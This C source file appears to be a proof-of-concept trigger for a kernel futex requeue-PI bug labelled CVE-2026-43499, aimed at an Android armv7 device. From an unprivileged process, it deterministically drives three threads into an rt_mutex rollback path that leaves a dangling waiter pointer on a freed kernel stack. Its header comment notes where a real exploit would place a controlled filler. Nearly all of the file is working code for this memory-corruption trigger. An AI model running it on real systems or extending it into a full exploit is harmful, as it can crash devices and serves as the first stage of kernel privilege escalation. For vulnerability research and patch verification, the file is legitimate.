/*
 * gl_trigger.c - deterministic reachability probe for CVE-2026-43499 on tank.
 *
 * Goal: prove that the rt_mutex remove_waiter() rollback can be reached
 * deterministically from an unprivileged process, without exploiting anything.
 *
 * Threads:
 *   A (main) owns Lx (PI), then waits on uaddr1 with FUTEX_WAIT_REQUEUE_PI
 *            targeting L2.
 *   C        owns L2 (PI), then blocks on Lx (PI). So C->pi_blocked_on == Lx.
 *   B        calls FUTEX_CMP_REQUEUE_PI(uaddr1 -> L2). The atomic trylock on
 *            L2 fails (C owns it), so rt_mutex_start_proxy_lock() queues A's
 *            waiter on L2 and walks the chain:
 *                owner(L2) = C -> blocked on Lx -> owner(Lx) = A = top_task
 *            => -EDEADLK => rollback remove_waiter() in B's context.
 *   A        times out of FUTEX_WAIT_REQUEUE_PI. The early-wakeup path returns
 *            -ETIMEDOUT without touching rt_waiter, so A->pi_blocked_on is
 *            left dangling on A's (now freed) kernel stack frame.
 *
 * Why not FUTEX_WAKE(A)? After the rollback, A's futex_q still has
 * q->rt_waiter set, and wake_futex() refuses to wake a PI waiter
 * ("refusing to wake PI futex", futex.c:954). The timeout path is therefore
 * the reliable release mechanism; a signal would also work but delivery
 * touches the kernel stack.
 *
 * Expected results (all must hold):
 *   CMP_REQUEUE_PI  == -1 / EDEADLK
 *   WAIT_REQUEUE_PI == -1 / ETIMEDOUT (or EWOULDBLOCK on a signal release)
 *   C's second LOCK_PI == 0
 *
 * This probe does NOT try to reclaim the stale waiter. A's first syscall after
 * the wait is FUTEX_UNLOCK_PI, which reuses the kernel stack frame (that is
 * what a real exploit would replace with a controlled filler). It therefore
 * exercises the buggy path without keeping a dangling pointer around.
 *
 * Build (NDK r27):
 *   armv7a-linux-androideabi21-clang -O2 -fPIE -pie -o gl_trigger gl_trigger.c
 *
 * Run: gl_trigger [rounds]   (each round is a separate forked child)
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_PRIVATE_FLAG
#define FUTEX_PRIVATE_FLAG 128
#endif

static uint32_t rd32(const uint32_t *p)
{
    return *(volatile const uint32_t *)p;
}

static double now_s(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

/* Read /proc/self/task/<tid>/wchan; empty if unreadable. */
static void read_wchan(pid_t tid, char *buf, size_t len)
{
    char path[64];
    int fd;
    ssize_t n;

    buf[0] = 0;
    snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", (int)tid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return;
    n = read(fd, buf, len - 1);
    if (n > 0)
        buf[n] = 0;
    close(fd);
}

static int wchan_has(pid_t tid, const char *needle)
{
    char buf[128];
    read_wchan(tid, buf, sizeof(buf));
    return strstr(buf, needle) != NULL;
}

static int futex6(uint32_t *uaddr, int op, uint32_t val,
                  const struct timespec *to, uint32_t *uaddr2, uint32_t val3)
{
    return (int)syscall(__NR_futex, uaddr, op, val, to, uaddr2, val3);
}

struct round {
    uint32_t lx;   /* PI lock owned by A */
    uint32_t l2;   /* PI lock owned by C, requeue target */
    uint32_t uaddr1; /* non-PI futex A waits on */

    volatile int a_owns_lx;
    volatile int c_owns_l2;
    volatile int a_waiting;
    volatile int b_done;
    pid_t a_tid;
    pid_t c_tid;

    int c_lock_l2_ret, c_lock_l2_err;
    int c_lock_lx_ret, c_lock_lx_err;
    int a_ret, a_err;
    int b_ret, b_err;
};

static struct round R;

static void msleep(int ms)
{
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

static void *thread_c(void *arg)
{
    (void)arg;
    R.c_tid = (pid_t)syscall(__NR_gettid);

    errno = 0;
    R.c_lock_l2_ret = futex6(&R.l2, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                             0, NULL, NULL, 0);
    R.c_lock_l2_err = errno;
    if (R.c_lock_l2_ret != 0)
        return NULL;
    printf("diag C: lock l2 ret=%d errno=%d l2=0x%08x\n",
           R.c_lock_l2_ret, R.c_lock_l2_err, rd32(&R.l2));
    R.c_owns_l2 = 1;

    /* A owns Lx before we block on it. */
    while (!R.a_owns_lx)
        msleep(1);

    errno = 0;
    R.c_lock_lx_ret = futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                             0, NULL, NULL, 0);
    R.c_lock_lx_err = errno;
    printf("diag C: lock lx ret=%d errno=%d lx=0x%08x\n",
           R.c_lock_lx_ret, R.c_lock_lx_err, rd32(&R.lx));

    /* We now own Lx; release it and L2. */
    futex6(&R.lx, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    futex6(&R.l2, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    return NULL;
}

static void *thread_b(void *arg)
{
    (void)arg;
    double t0 = now_s();
    char wa[128] = "";
    char wc[128] = "";
    int i;

    while (!R.a_waiting && now_s() - t0 < 1.0)
        msleep(1);

    /* Park A and C deterministically: poll their kernel wchan instead of
     * sleeping a fixed delay. On this 100 Hz kernel a 1 ms sleep can last a
     * full tick, which is what made the earlier version miss A's timeout. */
    for (i = 0; i < 200; i++) {
        int c_queued;
        read_wchan(R.a_tid, wa, sizeof(wa));
        read_wchan(R.c_tid, wc, sizeof(wc));
        c_queued = strstr(wc, "futex") || strstr(wc, "rt_mutex") ||
                   (rd32(&R.lx) & FUTEX_WAITERS);
        if (strstr(wa, "futex") && c_queued)
            break;
        msleep(1);
    }
    printf("diag: a_wchan='%s' c_wchan='%s' lx=0x%08x l2=0x%08x\n",
           wa, wc, rd32(&R.lx), rd32(&R.l2));

    /* Let the two blocked tasks settle, then requeue. */
    msleep(20);

    errno = 0;
    R.b_ret = futex6(&R.uaddr1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                     1, NULL, &R.l2, 0);
    R.b_err = errno;
    R.b_done = 1;
    return NULL;
}

static int one_round(void)
{
    pthread_t tb, tc;
    struct timespec to;
    int ok;

    memset(&R, 0, sizeof(R));

    errno = 0;
    if (futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
        printf("FAIL: A LOCK_PI(lx) errno=%d (%s)\n", errno, strerror(errno));
        return 2;
    }
    printf("diag A: lock lx ok, lx=0x%08x\n", rd32(&R.lx));
    R.a_owns_lx = 1;
    R.a_tid = (pid_t)syscall(__NR_gettid);

    if (pthread_create(&tc, NULL, thread_c, NULL) != 0) {
        printf("FAIL: pthread_create C\n");
        return 2;
    }
    while (!R.c_owns_l2)
        msleep(1);

    if (pthread_create(&tb, NULL, thread_b, NULL) != 0) {
        printf("FAIL: pthread_create B\n");
        return 2;
    }

    /* FUTEX_WAIT_REQUEUE_PI takes an ABSOLUTE CLOCK_MONOTONIC deadline in
     * 3.10 (unlike FUTEX_WAIT, which is relative). 200 ms: B's wchan handshake
     * requeues in a few ms, and the timeout is what releases A afterwards. */
    clock_gettime(CLOCK_MONOTONIC, &to);
    to.tv_nsec += 200 * 1000 * 1000L;
    if (to.tv_nsec >= 1000000000L) {
        to.tv_sec++;
        to.tv_nsec -= 1000000000L;
    }

    R.a_waiting = 1;
    errno = 0;
    R.a_ret = futex6(&R.uaddr1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                     0, &to, &R.l2, 0);
    R.a_err = errno;

    /* First syscall after the wait: reuses the stale kernel stack frame. */
    futex6(&R.lx, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);

    pthread_join(tb, NULL);
    pthread_join(tc, NULL);

    ok = (R.b_ret == -1 && R.b_err == EDEADLK) &&
         (R.a_ret == -1 && (R.a_err == ETIMEDOUT || R.a_err == EWOULDBLOCK)) &&
         (R.c_lock_lx_ret == 0);

    printf("round: requeue=%d/%d wait=%d/%d c_lx=%d/%d %s\n",
           R.b_ret, R.b_err, R.a_ret, R.a_err,
           R.c_lock_lx_ret, R.c_lock_lx_err, ok ? "OK" : "MISMATCH");
    return ok ? 0 : 3;
}

int main(int argc, char **argv)
{
    int rounds = 1;
    int ok = 0, bad = 0, i;

    if (argc > 1)
        rounds = atoi(argv[1]);
    if (rounds < 1)
        rounds = 1;

    for (i = 0; i < rounds; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            int rc = one_round();
            fflush(stdout);
            _exit(rc);
        }
        if (pid < 0) {
            printf("FAIL: fork\n");
            return 2;
        }
        int st = 0;
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
            ok++;
        else
            bad++;
    }

    printf("RESULT ok=%d bad=%d rounds=%d\n", ok, bad, rounds);
    return bad == 0 ? 0 : 1;
}
